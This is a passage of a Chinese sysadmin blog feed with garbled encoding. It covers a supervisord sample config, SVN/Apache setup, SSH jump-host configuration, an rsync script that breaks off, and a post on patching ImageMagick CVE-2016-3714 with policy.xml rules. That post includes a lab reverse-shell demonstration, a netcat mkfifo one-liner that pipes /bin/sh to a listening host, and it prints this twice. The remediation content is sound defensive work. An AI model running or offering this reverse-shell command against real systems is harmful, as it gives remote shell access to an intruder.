;nocleanup=true              ; (don&apos;t clean up tempfiles at start;default false)
;childlogdir=/tmp            ; (&apos;AUTO&apos; child log dir, default $TEMP)
;environment=KEY=&quot;value&quot;     ; (key value pairs to add to environment)
;strip_ansi=false            ; (strip ansi escape codes in logs; def. false)

; the below section must remain in the config file for RPC
; (supervisorctl/web interface) to work, additional interfaces may be
; added by defining them in separate rpcinterface: sections
[rpcinterface:supervisor]
supervisor.rpcinterface_factory = supervisor.rpcinterface:make_main_rpcinterface

[supervisorctl]
serverurl=unix:///tmp/supervisor.sock ; use a unix:// URL  for a unix socket
;serverurl=http://127.0.0.1:9001 ; use an http:// url to specify an inet socket
;username=chris              ; should be same as http_username if set
;password=123                ; should be same as http_password if set
;prompt=mysupervisor         ; cmd line prompt (default &quot;supervisor&quot;)
;history_file=~/.sc_history  ; use readline history if available

; The below sample program section shows all possible program subsection values,
; create one or more &apos;real&apos; program: sections to be able to control them under
; supervisor.

;[program:theprogramname]
;command=/bin/cat              ; the program (relative uses PATH, can take args)
;process_name=%(program_name)s ; process_name expr (default %(program_name)s)
;numprocs=1                    ; number of processes copies to start (def 1)
;directory=/tmp                ; directory to cwd to before exec (def no cwd)
;umask=022                     ; umask for process (default None)
;priority=999                  ; the relative start priority (default 999)
;autostart=true                ; start at supervisord start (default: true)
;startsecs=1                   ; # of secs prog must stay up to be running (def. 1)
;startretries=3                ; max # of serial start failures when starting (default 3)
;autorestart=unexpected        ; when to restart if exited after running (def: unexpected)
;exitcodes=0,2                 ; &apos;expected&apos; exit codes used with autorestart (default 0,2)
;stopsignal=QUIT               ; signal used to kill process (default TERM)
;stopwaitsecs=10               ; max num secs to wait b4 SIGKILL (default 10)
;stopasgroup=false             ; send stop signal to the UNIX process group (default false)
;killasgroup=false             ; SIGKILL the UNIX process group (def false)
;user=chrism                   ; setuid to this UNIX account to run the program
;redirect_stderr=true          ; redirect proc stderr to stdout (default false)
;stdout_logfile=/a/path        ; stdout log path, NONE for none; default AUTO
;stdout_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)
;stdout_logfile_backups=10     ; # of stdout logfile backups (default 10)
;stdout_capture_maxbytes=1MB   ; number of bytes in &apos;capturemode&apos; (default 0)
;stdout_events_enabled=false   ; emit events on stdout writes (default false)
;stderr_logfile=/a/path        ; stderr log path, NONE for none; default AUTO
;stderr_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)
;stderr_logfile_backups=10     ; # of stderr logfile backups (default 10)
;stderr_capture_maxbytes=1MB   ; number of bytes in &apos;capturemode&apos; (default 0)
;stderr_events_enabled=false   ; emit events on stderr writes (default false)
;environment=A=&quot;1&quot;,B=&quot;2&quot;       ; process environment additions (def no adds)
;serverurl=AUTO                ; override serverurl computation (childutils)

; The below sample eventlistener section shows all possible
; eventlistener subsection values, create one or more &apos;real&apos;
; eventlistener: sections to be able to handle event notifications
; sent by supervisor.

;[eventlistener:theeventlistenername]
;command=/bin/eventlistener    ; the program (relative uses PATH, can take args)
;process_name=%(program_name)s ; process_name expr (default %(program_name)s)
;numprocs=1                    ; number of processes copies to start (def 1)
;events=EVENT                  ; event notif. types to subscribe to (req&apos;d)
;buffer_size=10                ; event buffer queue size (default 10)
;directory=/tmp                ; directory to cwd to before exec (def no cwd)
;umask=022                     ; umask for process (default None)
;priority=-1                   ; the relative start priority (default -1)
;autostart=true                ; start at supervisord start (default: true)
;startsecs=1                   ; # of secs prog must stay up to be running (def. 1)
;startretries=3                ; max # of serial start failures when starting (default 3)
;autorestart=unexpected        ; autorestart if exited after running (def: unexpected)
;exitcodes=0,2                 ; &apos;expected&apos; exit codes used with autorestart (default 0,2)
;stopsignal=QUIT               ; signal used to kill process (default TERM)
;stopwaitsecs=10               ; max num secs to wait b4 SIGKILL (default 10)
;stopasgroup=false             ; send stop signal to the UNIX process group (default false)
;killasgroup=false             ; SIGKILL the UNIX process group (def false)
;user=chrism                   ; setuid to this UNIX account to run the program
;redirect_stderr=false         ; redirect_stderr=true is not allowed for eventlisteners
;stdout_logfile=/a/path        ; stdout log path, NONE for none; default AUTO
;stdout_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)
;stdout_logfile_backups=10     ; # of stdout logfile backups (default 10)
;stdout_events_enabled=false   ; emit events on stdout writes (default false)
;stderr_logfile=/a/path        ; stderr log path, NONE for none; default AUTO
;stderr_logfile_maxbytes=1MB   ; max # logfile bytes b4 rotation (default 50MB)
;stderr_logfile_backups=10     ; # of stderr logfile backups (default 10)
;stderr_events_enabled=false   ; emit events on stderr writes (default false)
;environment=A=&quot;1&quot;,B=&quot;2&quot;       ; process environment additions
;serverurl=AUTO                ; override serverurl computation (childutils)

; The below sample group section shows all possible group values,
; create one or more &apos;real&apos; group: sections to create &quot;heterogeneous&quot;
; process groups.

;[group:thegroupname]
;programs=progname1,progname2  ; each refers to &apos;x&apos; in [program:x] definitions
;priority=999                  ; the relative start priority (default 999)

; The [include] section can just contain the &quot;files&quot; setting.  This
; setting can list multiple files (separated by whitespace or
; newlines).  It can also contain wildcards.  The filenames are
; interpreted as relative to this file.  Included files *cannot*
; include files themselves.

;[include]
;files = relative/directory/*.ini
</code></pre><p>åˆ›å»ºé…ç½®æ–‡ä»¶ï¼š</p>
<pre><code>echo_supervisord_conf &gt; /etc/supervisord.conf
</code></pre><p>å‚è€ƒ:</p>
<p><a href="https://fukun.org/archives/07102224.html" target="_blank" rel="external">Supervisorçš„å®‰è£…ä¸ä½¿ç”¨å…¥é—¨</a></p>
<p><a href="http://zengxh.blog.51cto.com/10650604/1713838" target="_blank" rel="external">supervisorå®‰è£…å¹¶ç›‘æ§è¿›ç¨‹</a></p>
<p><a href="http://www.cnblogs.com/shanyou/p/5075744.html" target="_blank" rel="external">è¿›ç¨‹ç›‘æ§å·¥å…·supervisor å¯åŠ¨Mongodb</a></p>
<p><a href="http://liyangliang.me/posts/2015/06/using-supervisor/" target="_blank" rel="external">ä½¿ç”¨ supervisor ç®¡ç†è¿›ç¨‹</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5B89_u88C5_uFF08Centos_uFF09_uFF1A"><a href="#u5B89_u88C5_uFF08Centos_uFF09_uFF1A" class="headerlink" title="å®‰è£…ï¼ˆCentosï¼‰ï¼š"></a>å®‰è£…ï¼ˆCe]]>
    </summary>
    
      <category term="supervisor" scheme="http://yoursite.com/tags/supervisor/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ä¿®å¤ImageMagicæ¼æ´(CVE-2016-3714)]]></title>
    <link href="http://yoursite.com/2016/05/10/%E4%BF%AE%E5%A4%8DImageMagic%E6%BC%8F%E6%B4%9E-CVE-2016-3714/"/>
    <id>http://yoursite.com/2016/05/10/ä¿®å¤ImageMagicæ¼æ´-CVE-2016-3714/</id>
    <published>2016-05-10T10:29:23.000Z</published>
    <updated>2016-05-11T07:03:19.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C"><a href="#u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C" class="headerlink" title="åå¼¹ Shell (Reverse Shell) å®éªŒ"></a>åå¼¹ Shell (Reverse Shell) å®éªŒ</h3><p>å°†node1çš„ shell åå¼¹ç»™ node3</p>
<p>node3ç›‘å¬2333ç«¯å£:</p>
<pre><code>[root@node3 ~]# nc -lvv 2333
Connection from 10.45.207.236 port 2333 [tcp/snapp] accepted
sh-4.1# hostname
hostname
node1
</code></pre><p>node1 ncåå¼¹:</p>
<pre><code>[root@node1 ~]# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc node3_ip 2333 &gt;/tmp/f
rm: cannot remove `/tmp/f&apos;: No such file or directory
</code></pre><a id="more"></a>
<h3 id="u4FEE_u590D_u8FC7_u7A0B_3A"><a href="#u4FEE_u590D_u8FC7_u7A0B_3A" class="headerlink" title="ä¿®å¤è¿‡ç¨‹:"></a>ä¿®å¤è¿‡ç¨‹:</h3><p>å…ˆåˆ°<a href="https://github.com/ImageTragick/PoCs" target="_blank" rel="external">è¿™é‡Œ</a>ä¸‹è½½æ£€æµ‹è„šæœ¬:</p>
<p>æ£€æµ‹è„šæœ¬çš„ä½¿ç”¨æ–¹æ³•:</p>
<pre><code>git clone https://github.com/ImageTragick/PoCs.git
cd PoCs
./test.sh
</code></pre><p>å¼€å§‹æ£€æµ‹</p>
<pre><code>[root@HD_Server_Config PoCs]# ./test.sh
testing read
UNSAFE

testing delete
UNSAFE

testing http with local port: 18781
SAFE

testing http with nonce: apPod0Vg
SAFE

testing rce1
UNSAFE

testing rce2
SAFE

testing MSL
UNSAFE
</code></pre><p>å¯ä»¥çœ‹åˆ°, æ˜¯ UNSAFE çš„</p>
<p>ä¿®å¤æ–¹æ¡ˆ:</p>
<p>1.åœ¨ä¸Šä¼ å›¾ç‰‡æ—¶éœ€è¦é€šè¿‡æ–‡ä»¶å†…å®¹æ¥åˆ¤æ–­ç”¨æˆ·ä¸Šä¼ çš„æ˜¯å¦ä¸ºçœŸå®å›¾ç‰‡ç±»å‹.(è¿™ä¸ªéœ€è¦å‘ŠçŸ¥å¼€å‘äººå‘˜)</p>
<p>2.ä½¿ç”¨ç­–ç•¥é…ç½®æ–‡ä»¶æ¥ç¦ç”¨ImageMagickçš„æœ‰é£é™©çš„ç¼–ç å™¨</p>
<p>å¯¹äºImageMagickå…¨å±€ç­–ç•¥é…ç½®æ–‡ä»¶åœ¨/etc/ImageMagickä¸‹å¯¹policy.xmlæœ€åä¸€è¡Œè¿›è¡Œå¢åŠ ä¸‹åˆ—é…ç½®:</p>
<pre><code>vi /etc/ImageMagick/policy.xml

&lt;policymap&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;EPHEMERAL&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;URL&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;HTTPS&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MVG&quot; /&gt;

  &lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;MSL&quot; /&gt;

&lt;/policymap&gt;
</code></pre><p>å†æ¬¡è¿è¡Œæ£€æµ‹è„šæœ¬:</p>
<pre><code>[root@HD_Server_Config PoCs]# ./test.sh
testing read
SAFE

testing delete
SAFE

testing http with local port: 47221
SAFE

testing http with nonce: hMtPw5DB
SAFE

testing rce1
SAFE

testing rce2
SAFE

testing MSL
SAFE
</code></pre><p>å‚è€ƒ:</p>
<p><a href="https://imagetragick.com/" target="_blank" rel="external">https://imagetragick.com/</a></p>
<p><a href="http://bobao.360.cn/learning/detail/2862.html" target="_blank" rel="external">CVE-2016-3714ImageMagickè¿œç¨‹æ‰§è¡Œæ¼æ´ä¿®å¤å»ºè®®</a></p>
<p><a href="http://le4f.net/post/post/reverse-shell-during-the-penetration-test" target="_blank" rel="external">æ¸—é€æµ‹è¯•:åå¼¹ä¸è½¬å‘å°ç»“ - Reverse Shell During the Penetration Test</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C"><a href="#u53CD_u5F39_Shell__28Reverse_Shell_29__u5B9E_u9A8C" class="headerlink" title="åå¼¹ Shell (Reverse Shell) å®éªŒ"></a>åå¼¹ Shell (Reverse Shell) å®éªŒ</h3><p>å°†node1çš„ shell åå¼¹ç»™ node3</p>
<p>node3ç›‘å¬2333ç«¯å£:</p>
<pre><code>[root@node3 ~]# nc -lvv 2333
Connection from 10.45.207.236 port 2333 [tcp/snapp] accepted
sh-4.1# hostname
hostname
node1
</code></pre><p>node1 ncåå¼¹:</p>
<pre><code>[root@node1 ~]# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc node3_ip 2333 &gt;/tmp/f
rm: cannot remove `/tmp/f&apos;: No such file or directory
</code></pre>]]>
    
    </summary>
    
      <category term="Reverse Shell" scheme="http://yoursite.com/tags/Reverse-Shell/"/>
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svn é…ç½®http æœåŠ¡]]></title>
    <link href="http://yoursite.com/2016/05/06/svn-%E9%85%8D%E7%BD%AEhttp-%E6%9C%8D%E5%8A%A1/"/>
    <id>http://yoursite.com/2016/05/06/svn-é…ç½®http-æœåŠ¡/</id>
    <published>2016-05-06T03:07:33.000Z</published>
    <updated>2016-05-09T09:59:32.000Z</updated>
    <content type="html"><![CDATA[<h3 id="u5B89_u88C5_u670D_u52A1"><a href="#u5B89_u88C5_u670D_u52A1" class="headerlink" title="å®‰è£…æœåŠ¡"></a>å®‰è£…æœåŠ¡</h3><p>å®‰è£…http</p>
<pre><code>yum install -y httpd
</code></pre><p>å®‰è£… svn</p>
<pre><code>yum install -y subversion
</code></pre><p>å®‰è£…Apache SVNæ¨¡å—</p>
<pre><code>yum install -y mod_dav_svn
</code></pre><h3 id="u914D_u7F6E"><a href="#u914D_u7F6E" class="headerlink" title="é…ç½®"></a>é…ç½®</h3><p>ç„¶åæ˜¯æŠŠ svn é…ç½®è¿è¡Œèµ·æ¥, æ•™ç¨‹ç½‘ä¸Šå¾ˆå¤šâ€¦ </p>
<p>å†ç„¶å.æŠŠ svn æ•´åˆè¿› apache çš„é…ç½®æ–‡ä»¶</p>
<pre><code>[root@iZ94c5cs7guZ httpd]# cat /etc/httpd/conf.d/subversion.conf
LoadModule dav_svn_module     modules/mod_dav_svn.so
LoadModule authz_svn_module   modules/mod_authz_svn.so

&lt;Location /svn&gt;    #è¿™è¡Œæ˜¯é…ç½®è®¿é—®çš„ url , æ¯”å¦‚ http://a.com/svn/repos
    DAV svn
    SVNParentPath /data/svndata        #è¿™ä¸ªå°±æ˜¯svnçš„ä¸»ç›®å½•
    AuthType Basic
    AuthName &quot;Authorization SVN: &quot;
    AuthzSVNAccessFile /data/svndata/authz    #è¿™ä¸ªæ–‡ä»¶æ˜¯ä»æŸä¸ªä»“åº“è€ƒè¿‡æ¥çš„, æƒé™è‡ªå·±æ ¹æ®éœ€æ±‚ä¿®æ”¹
    AuthUserFile /etc/httpd/conf.d/passwdfile   #è¿™ä¸ªæ–‡ä»¶æ˜¯ htpasswd ç”Ÿæˆçš„, ç”Ÿæˆçš„ç”¨æˆ·åè¦å†™è¿›ä¸Šé¢çš„ auth æ–‡ä»¶
    Require valid-user
&lt;/Location&gt;
</code></pre><p>ä¿®æ”¹ä¸€äº›æƒé™:</p>
<pre><code>chown apache:apache -R /data/svndata
chown apache:apache /etc/httpd/conf.d/passwdfile
</code></pre><p>htpasswd æ–°å¢ç”¨æˆ·:</p>
<pre><code>htpasswd  -n username
</code></pre><p>ç„¶åå¯ä»¥é…ç½® nginx åå‘ä»£ç†:</p>
<h4 id="u751F_u6210_SSL__u8BC1_u4E66"><a href="#u751F_u6210_SSL__u8BC1_u4E66" class="headerlink" title="ç”Ÿæˆ SSL è¯ä¹¦"></a>ç”Ÿæˆ SSL è¯ä¹¦</h4><p>ä¸Šé¢çš„è¿˜æ²¡æœ‰ https åŠ å¯†</p>
<pre><code># cd /etc/httpd/conf/
# openssl req -new -x509 -keyout server.key -out server.crt -days 365 -nodes  #è¿™ä¸ªæ˜¯ç¼©365å¤©ä¹‹åä¸èƒ½ç”¨äº†å˜›, æ„Ÿè§‰åœ¨æŒ–å‘...
</code></pre><h4 id="u6DFB_u52A0_u7528_u6237_u7684_u811A_u672C"><a href="#u6DFB_u52A0_u7528_u6237_u7684_u811A_u672C" class="headerlink" title="æ·»åŠ ç”¨æˆ·çš„è„šæœ¬"></a>æ·»åŠ ç”¨æˆ·çš„è„šæœ¬</h4><pre><code>cat svn_add_http_admin.sh
#!/bin/bash

SVNPATH=/data/svndata/        #svn ä¸»ç›®å½•
PASSWDFILE=/etc/httpd/conf.d/passwdfile

read -p &quot;input user name: &quot; USER
read -p &quot;input password: &quot; PASSWD

/usr/bin/htpasswd -b $PASSWDFILE $USER $PASSWD
sed  -ri &quot;s@(^admin = .*)@\1\,$USER@&quot; $SVNPATH/authz
</code></pre><p>å‚è€ƒ:</p>
<p><a href="http://my.oschina.net/u/206356/blog/287635" target="_blank" rel="external">Centos ä¸‹æ­å»ºSVN ï¼‹ Apache æœåŠ¡å™¨</a></p>
<p><a href="http://www.opstool.com/article/282" target="_blank" rel="external">CentOSæ­å»ºNginx+Subversionç¯å¢ƒ</a></p>
<p><a href="https://wiki.archlinux.org/index.php/Subversion_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87\" target="_blank" rel="external">Subversion (ç®€ä½“ä¸­æ–‡)</a>)</p>
<p><a href="http://fengchj.com/?p=735" target="_blank" rel="external">Apacheæ ¸å¿ƒ(Core)æŒ‡ä»¤<location>å’Œ<directory>åŒºåˆ«</directory></location></a></p>
<p><a href="https://blog.linuxeye.com/333.html" target="_blank" rel="external">Apache htpasswdå‘½ä»¤ç”¨æ³•è¯¦è§£</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="u5B89_u88C5_u670D_u52A1"><a href="#u5B89_u88C5_u670D_u52A1" class="headerlink" title="å®‰è£…æœåŠ¡"></a>å®‰è£…æœåŠ¡</h3><p>å®‰è£…http</p>
<pre><code>yu]]>
    </summary>
    
      <category term="apache" scheme="http://yoursite.com/tags/apache/"/>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[svnhook åŒæ­¥ä»£ç åˆ°è¿œç«¯æœºå™¨]]></title>
    <link href="http://yoursite.com/2016/05/05/svnhook-%E5%90%8C%E6%AD%A5%E4%BB%A3%E7%A0%81%E5%88%B0%E8%BF%9C%E7%AB%AF%E6%9C%BA%E5%99%A8/"/>
    <id>http://yoursite.com/2016/05/05/svnhook-åŒæ­¥ä»£ç åˆ°è¿œç«¯æœºå™¨/</id>
    <published>2016-05-05T07:30:03.000Z</published>
    <updated>2016-05-05T07:56:21.000Z</updated>
    <content type="html"><![CDATA[<p>æœ¬æ–‡ä»…åšè®°å½•</p>
<p>post-commit è„šæœ¬ä¸»è¦æ˜¯é€šè¿‡ssh è¿œç¨‹å‘½ä»¤æ¥æ‰§è¡Œè‡ªåŠ¨æ›´æ–°, éœ€é…ç½® ssh å…å¯†ç ç™»é™†</p>
<pre><code>/usr/bin/ssh -p22 root@remote_ip &quot;/bin/bash /opt/www/svn_beta_update.sh&quot; 2&gt;&gt;/tmp/svn_error.log
</code></pre><p>è¿œç«¯æœºå™¨çš„åŒæ­¥ä»£ç è„šæœ¬:</p>
<pre><code>#!/bin/bash

/usr/bin/svn update /opt/www/dest/ 2&gt;&gt; svn_update_error.log
</code></pre><p>å‚è€ƒ:</p>
<p><a href="http://denglz.blog.51cto.com/3617037/1341835" target="_blank" rel="external">SVN ä½¿ç”¨ hooks è‡ªåŠ¨æ›´æ–°ä»£ç åˆ°è¿œç¨‹çš„webç›®å½•ä¸‹</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>æœ¬æ–‡ä»…åšè®°å½•</p>
<p>post-commit è„šæœ¬ä¸»è¦æ˜¯é€šè¿‡ssh è¿œç¨‹å‘½ä»¤æ¥æ‰§è¡Œè‡ªåŠ¨æ›´æ–°, éœ€é…ç½® ssh å…å¯†ç ç™»é™†</p>
<pre><code>/usr/bin/ssh -p22 root@remote_ip &quot;/bin/bash /opt/www/]]>
    </summary>
    
      <category term="svn" scheme="http://yoursite.com/tags/svn/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos 7 é…ç½® ftp æœåŠ¡å™¨]]></title>
    <link href="http://yoursite.com/2016/05/05/Centos-7-%E9%85%8D%E7%BD%AE-ftp-%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    <id>http://yoursite.com/2016/05/05/Centos-7-é…ç½®-ftp-æœåŠ¡å™¨/</id>
    <published>2016-05-05T06:35:05.000Z</published>
    <updated>2016-05-05T06:39:07.000Z</updated>
    <content type="html"><![CDATA[<p>ç…§è¿™ä¸ªåš</p>
<p><a href="https://www.zybuluo.com/hshustc/note/180958" target="_blank" rel="external">CentOS7.0å®‰è£…é…ç½®vsftp</a></p>
<p>å‚è€ƒ:</p>
<p><a href="http://www.ha97.com/4113.html" target="_blank" rel="external">Linuxä¸‹vsftpdåŸºæœ¬é…ç½®å’Œè™šæ‹Ÿç”¨æˆ·è®¾ç½®çš„å®‰å…¨æ–¹æ³•</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<p>ç…§è¿™ä¸ªåš</p>
<p><a href="https://www.zybuluo.com/hshustc/note/180958" target="_blank" rel="external">CentOS7.0å®‰è£…é…ç½®vsftp</a></p>
<p>å‚è€ƒ:</p>
<p]]>
    </summary>
    
      <category term="ftp" scheme="http://yoursite.com/tags/ftp/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[é…ç½®sshå’Œansibleé€šè¿‡è·³æ¿æœºç›´æ¥ç™»å½•ç›®æ ‡æœºå™¨]]></title>
    <link href="http://yoursite.com/2016/05/03/%E9%85%8D%E7%BD%AEssh%E5%92%8Cansible%E9%80%9A%E8%BF%87%E8%B7%B3%E6%9D%BF%E6%9C%BA%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95%E7%9B%AE%E6%A0%87%E6%9C%BA%E5%99%A8/"/>
    <id>http://yoursite.com/2016/05/03/é…ç½®sshå’Œansibleé€šè¿‡è·³æ¿æœºç›´æ¥ç™»å½•ç›®æ ‡æœºå™¨/</id>
    <published>2016-05-03T10:46:51.000Z</published>
    <updated>2016-05-06T01:04:21.000Z</updated>
    <content type="html"><![CDATA[<h3 id="ssh_u914D_u7F6E"><a href="#ssh_u914D_u7F6E" class="headerlink" title="sshé…ç½®"></a>sshé…ç½®</h3><p>æœ‰è¿™æ ·çš„åœºæ™¯, æˆ‘ä»¬æœ¬åœ°çš„æœºå™¨ A éœ€è¦é€šè¿‡å…ˆç™»å½•è·³æ¿æœº B , ç„¶ååœ¨ B ä¸Šç™»å½•ç›®æ ‡æœºå™¨ C, æœ¬æ–‡ä»‹ç»å°±æ˜¯é€šè¿‡é…ç½®, å®ç°ä» A ç›´æ¥ç™»å½• C .</p>
<p>é¦–å…ˆ, å°† A çš„å…¬é’¥æ”¾åˆ° B , Cçš„ authorized_keys æ–‡ä»¶ä¸­, ç„¶åç¡®ä¿èƒ½ä» Aå…å¯†ç ç™»å½•åˆ° B. å¦‚æœçœ‹ä¸æ‡‚è¿™å¥, è¯·å…ˆå»è¡¥ä¹  ssh é€šè¿‡å¯†é’¥å…å¯†ç ç™»å½•çš„å†…å®¹. </p>
<p>åœ¨Aæœºçš„ <code>~/.ssh/config</code> ä¸­é…ç½®</p>
<pre><code>host Server_C
user=user_to_C             #è¿™ä¸ªç”¨æˆ·æ˜¯ B ä¸Šç™»å½•åˆ° C çš„ç”¨æˆ·
port=22                #è¿™ä¸ªç«¯å£æ˜¯ B ä¸Šç™»å½•åˆ° C çš„ç«¯å£
hostname=Server_C_IP
identityfile=~/.ssh/id_rsa          #æœ¬åœ°ç§é’¥æ–‡ä»¶
proxycommand ssh user_to_B@Server_B_IP -p 2000 nc %h %p      # è½¬å‘å‘½ä»¤, æ³¨æ„æ˜¯ A ç™»å½•åˆ° B çš„ç”¨æˆ·, IP å’Œç«¯å£
forwardagent yes
</code></pre><a id="more"></a>
<p>ç„¶ååœ¨Aä¸Šæ‰§è¡Œ ssh Server_C å°±èƒ½ç™»å½• åˆ° C äº†</p>
<h3 id="Ansible__u7684_u914D_u7F6E"><a href="#Ansible__u7684_u914D_u7F6E" class="headerlink" title="Ansible çš„é…ç½®"></a>Ansible çš„é…ç½®</h3><p>åŸæ¥ansibleå¯ä»¥ç›´æ¥ç”¨.ssh/config çš„ä¸œè¥¿â€¦åªè¦åå­—å¯¹ä¸Šå°±è¡Œäº†â€¦</p>
<p>æ¯”å¦‚ ansible/hosts é‡Œå¯ä»¥è¿™æ ·ç”¨ Server_C</p>
<pre><code>[S_C]
Server_C
</code></pre><p>ç„¶å ssh è·³è½¬ä»€ä¹ˆçš„, ä¹Ÿå¯ä»¥ç”¨ ssh é…ç½®é‡Œé¢çš„äº†</p>
<p>ä¸è¿‡å¦‚æœè·³è½¬å ,å¦‚æœç™»é™†ç›®æ ‡æœºå™¨ç”¨æˆ·ä¸æ˜¯ root ç”¨æˆ·, æ‰§è¡Œ sudo çš„æ—¶å€™ä¼šæœ‰é—®é¢˜.</p>
<h3 id="windows__u4E0B_u7528_xshell__u914D_u7F6E_u767B_u9646_u8DF3_u8F6C"><a href="#windows__u4E0B_u7528_xshell__u914D_u7F6E_u767B_u9646_u8DF3_u8F6C" class="headerlink" title="windows ä¸‹ç”¨ xshell é…ç½®ç™»é™†è·³è½¬"></a>windows ä¸‹ç”¨ xshell é…ç½®ç™»é™†è·³è½¬</h3><p><a href="http://blog.csdn.net/fly542/article/details/7513571" target="_blank" rel="external">xshell è‡ªåŠ¨ç™»å½•ä¸è‡ªåŠ¨è·³è½¬</a></p>
<p>xshell å®é™…æ˜¯é…ç½®Aç™»é™†åˆ°è·³æ¿æœº Bä¹‹åè‡ªåŠ¨æ‰§è¡Œçš„ ç™»é™†åˆ° C çš„å‘½ä»¤, åŒºåˆ«åœ¨äºä¸éœ€è¦å°† A çš„å…¬é’¥æ”¾åˆ° C çš„authorized_keysä¸­, è€Œæ˜¯å°† B ç™»é™† C ç”¨æˆ·çš„å…¬é’¥æ”¾åˆ° C çš„ authorized_keys æ–‡ä»¶ä¸­</p>
<p>å‚è€ƒ:</p>
<p><a href="http://mingxinglai.com/cn/2015/07/ssh-proxycommand/" target="_blank" rel="external">SSHç©¿è¶Šè·³æ¿æœºï¼šä¸€æ¡å‘½ä»¤è·¨è¶Šè·³æ¿æœºç›´æ¥ç™»é™†è¿œç¨‹è®¡ç®—æœº</a></p>
<p><a href="http://www.cweye.net/2015/07/17/ansible-jumper.html" target="_blank" rel="external">Ansibleé€šè¿‡è·³æ¿æœºç®¡ç†æœåŠ¡å™¨</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h3 id="ssh_u914D_u7F6E"><a href="#ssh_u914D_u7F6E" class="headerlink" title="sshé…ç½®"></a>sshé…ç½®</h3><p>æœ‰è¿™æ ·çš„åœºæ™¯, æˆ‘ä»¬æœ¬åœ°çš„æœºå™¨ A éœ€è¦é€šè¿‡å…ˆç™»å½•è·³æ¿æœº B , ç„¶ååœ¨ B ä¸Šç™»å½•ç›®æ ‡æœºå™¨ C, æœ¬æ–‡ä»‹ç»å°±æ˜¯é€šè¿‡é…ç½®, å®ç°ä» A ç›´æ¥ç™»å½• C .</p>
<p>é¦–å…ˆ, å°† A çš„å…¬é’¥æ”¾åˆ° B , Cçš„ authorized_keys æ–‡ä»¶ä¸­, ç„¶åç¡®ä¿èƒ½ä» Aå…å¯†ç ç™»å½•åˆ° B. å¦‚æœçœ‹ä¸æ‡‚è¿™å¥, è¯·å…ˆå»è¡¥ä¹  ssh é€šè¿‡å¯†é’¥å…å¯†ç ç™»å½•çš„å†…å®¹. </p>
<p>åœ¨Aæœºçš„ <code>~/.ssh/config</code> ä¸­é…ç½®</p>
<pre><code>host Server_C
user=user_to_C             #è¿™ä¸ªç”¨æˆ·æ˜¯ B ä¸Šç™»å½•åˆ° C çš„ç”¨æˆ·
port=22                #è¿™ä¸ªç«¯å£æ˜¯ B ä¸Šç™»å½•åˆ° C çš„ç«¯å£
hostname=Server_C_IP
identityfile=~/.ssh/id_rsa          #æœ¬åœ°ç§é’¥æ–‡ä»¶
proxycommand ssh user_to_B@Server_B_IP -p 2000 nc %h %p      # è½¬å‘å‘½ä»¤, æ³¨æ„æ˜¯ A ç™»å½•åˆ° B çš„ç”¨æˆ·, IP å’Œç«¯å£
forwardagent yes
</code></pre>]]>
    
    </summary>
    
      <category term="ansible" scheme="http://yoursite.com/tags/ansible/"/>
    
      <category term="ssh" scheme="http://yoursite.com/tags/ssh/"/>
    
      <category term="it" scheme="http://yoursite.com/categories/it/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Centos7 é…ç½® rsync åŒæ­¥çš„ä¸€ä¸ª shell è„šæœ¬]]></title>
    <link href="http://yoursite.com/2016/05/03/Centos7-%E9%85%8D%E7%BD%AE-rsync-%E5%90%8C%E6%AD%A5%E7%9A%84%E4%B8%80%E4%B8%AA-shell-%E8%84%9A%E6%9C%AC/"/>
    <id>http://yoursite.com/2016/05/03/Centos7-é…ç½®-rsync-åŒæ­¥çš„ä¸€ä¸ª-shell-è„šæœ¬/</id>
    <published>2016-05-03T03:05:54.000Z</published>
    <updated>2016-05-11T10:47:43.000Z</updated>
    <content type="html"><![CDATA[<p>rsync è„šæœ¬</p>
<a id="more"></a>
<pre><code>cat /root/shell/set_rsync.sh
#!/bin/bash

# æ­¤è„šæœ¬ç”¨æ¥é…ç½® rsync æœåŠ¡ç«¯

# å®šä¹‰ä¸€äº›å˜é‡

RPATH=/etc/rsyncd.d
CONF=$RPATH/rsyncd.conf
PASSWD_FILE=$RPATH/rsyncd.password
AUTH=$RPATH/rsyncd.secrets

#æœ¬æœº IP
ADDRESS=192.168.0.2
# å…è®¸è®¿é—®æœåŠ¡çš„ IP
ALLOW_IP=192.168.0.3
